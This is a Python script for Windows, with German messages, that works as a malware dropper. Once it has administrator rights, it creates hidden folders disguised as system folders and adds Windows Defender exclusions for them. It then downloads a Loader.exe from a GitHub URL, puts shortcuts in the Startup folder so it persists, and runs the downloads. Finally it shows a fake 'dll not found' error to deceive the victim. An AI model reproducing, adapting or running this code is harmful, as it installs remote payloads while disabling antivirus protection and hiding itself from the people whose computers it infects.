import os
import sys
import ctypes
import urllib.request
import subprocess
import win32api
import win32con
import win32com.client
from tkinter import messagebox
import traceback

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
    except Exception as e:
        messagebox.showerror("Error", f"Failed to run as admin: {str(e)}")
    sys.exit(0)

def create_shortcut(target_path, shortcut_name=None):
    try:
        if shortcut_name is None:
            shortcut_name = os.path.splitext(os.path.basename(target_path))[0]
        
        startup_folder = os.path.join(
            os.getenv('APPDATA'), 
            'Microsoft', 
            'Windows', 
            'Start Menu', 
            'Programs', 
            'Startup'
        )
        
        shortcut_path = os.path.join(startup_folder, f"{shortcut_name}.lnk")
        
        if not os.path.exists(target_path):
            raise FileNotFoundError(f"Zieldatei {target_path} existiert nicht!")
        
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target_path
        shortcut.WorkingDirectory = os.path.dirname(target_path)
        shortcut.save()
        
        if not os.path.exists(shortcut_path):
            raise Exception("Verknüpfung wurde nicht im Startup-Ordner erstellt!")
        
        return True
    except Exception as e:
        messagebox.showerror("Error", f"Fehler: {str(e)}")
        return False

def download_file(url, target_dir):
    try:
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
            win32api.SetFileAttributes(target_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
        
        file_name = os.path.basename(url)
        save_path = os.path.join(target_dir, file_name)
        
        urllib.request.urlretrieve(url, save_path)
        print(f"Download erfolgreich: {file_name}")
        
        if file_name.endswith('.exe'):
            with open(save_path, 'rb') as f:
                if b'This program cannot be run in DOS mode' not in f.read(1024):
                    os.remove(save_path)
                    raise Exception("Die EXE-Datei ist keine gültige Windows-Anwendung")
        
        return save_path
    except Exception as e:
        messagebox.showerror("Download Error", f"Download fehlgeschlagen: {e}")
        return None

def create_qusar_folder():
    try:
        qusar_folder = os.path.join(os.getenv('APPDATA'), 'Windows-System')
        
        if not os.path.exists(qusar_folder):
            os.makedirs(qusar_folder)
            win32api.SetFileAttributes(qusar_folder, win32con.FILE_ATTRIBUTE_HIDDEN)
            print(f"Qusar-Ordner erstellt: {qusar_folder}")
        
        try:
            subprocess.run(
                ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{qusar_folder}'"],
                check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            print(f"Windows Defender Ausnahme hinzugefügt für: {qusar_folder}")
        except subprocess.CalledProcessError as e:
            print(f"Fehler beim Hinzufügen der Windows Defender Ausnahme: {e.stderr.decode()}")
        
        return qusar_folder
    except Exception as e:
        messagebox.showerror("Folder Error", f"Fehler beim Erstellen des Qusar-Ordners: {e}")
        return None

def main():
    try:
        if not is_admin():
            run_as_admin()
            return 0

        DOWNLOAD_URLS = [
            "https://github.com/BananenbrotV1/-/raw/main/Loader.exe",
            "Link2",
            "Link3",
        ]
        
        qusar_folder = create_qusar_folder()
        if not qusar_folder:
            return 1
            
        HIDDEN_FOLDER = "SystemApps"
        TARGET_DIR = os.path.join(os.getenv('APPDATA'), HIDDEN_FOLDER)
        
        for folder in [TARGET_DIR, qusar_folder]:
            try:
                subprocess.run(
                    ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{folder}'"],
                    check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
            except subprocess.CalledProcessError as e:
                print(f"Fehler bei Defender-Ausnahme für {folder}: {e.stderr.decode()}")

        for url in DOWNLOAD_URLS:
            file_path = download_file(url, TARGET_DIR)
            if file_path:
                if create_shortcut(file_path):
                    print(f"Verknüpfung erstellt für: {file_path}")
                
                try:
                    if file_path.endswith('.exe'):
                        subprocess.Popen([file_path], shell=True)
                        print(f"Programm gestartet: {file_path}")
                except Exception as e:
                    print(f"Programmstart fehlgeschlagen: {e}")

        messagebox.showinfo("Info", "Fail, D3T§13.dll not Found!")
        return 0
        
    except Exception as e:
        messagebox.showerror("Critical Error", f"An unexpected error occurred:\n{str(e)}\n\n{traceback.format_exc()}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
